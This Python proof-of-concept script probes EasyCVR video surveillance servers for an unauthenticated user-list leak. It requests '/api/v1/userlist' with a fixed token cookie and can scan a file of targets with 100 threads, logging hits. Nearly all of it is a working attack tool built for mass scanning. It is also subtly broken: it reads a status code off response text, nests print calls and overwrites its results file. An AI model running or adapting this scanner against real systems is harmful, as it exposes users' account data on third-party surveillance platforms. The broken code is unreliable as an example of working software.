import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="视频监控汇聚平台EasyCVR存在用户信息泄漏漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(print(f"Usag:\n\t python3 {sys.argv[0]} -h"))
    
def poc(target):
    payload_url = '/api/v1/userlist?pageindex=0&pagesize=10'   
    url = target + payload_url
    headers = {
        "Cookie": "token=5YftUKGIR",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Dnt": "1",
        "Upgrade-Insecure-Requests": "1",
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if res.status_code == 200 and "Username" in res:
            print(f"[+]该url:{target}存在用户信息泄漏漏洞")
            with open('result.txt','w',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在用户信息泄漏漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在用户信息泄漏漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()